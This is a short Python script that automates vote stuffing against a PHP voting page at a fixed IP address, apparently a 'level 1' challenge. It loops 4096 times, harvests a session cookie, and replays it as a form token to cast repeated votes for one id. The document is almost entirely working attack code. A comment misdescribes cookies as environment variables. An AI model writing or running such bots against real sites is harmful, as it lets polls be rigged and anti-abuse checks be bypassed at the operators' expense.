#!/usr/bin/python3

import requests


host = "http://158.69.76.135/level1.php"
for i in range(4096):
    response = requests.get('http://158.69.76.135/level1.php')
    payload = {'id': '1528', 'holdthedoor': 'submit',
               'key': response.cookies['HoldTheDoor']}
    cookies = {'HoldTheDoor': response.cookies['HoldTheDoor']}
    req = requests.post(host, payload, cookies=cookies)
    print("vote: {} status: {}".format(i, response.status_code))

"""
Notice that cookies is a environmental variable, so that is why
I have to define it in that way in line 14
"""

""" print(response.cookies['HoldTheDoor']) """
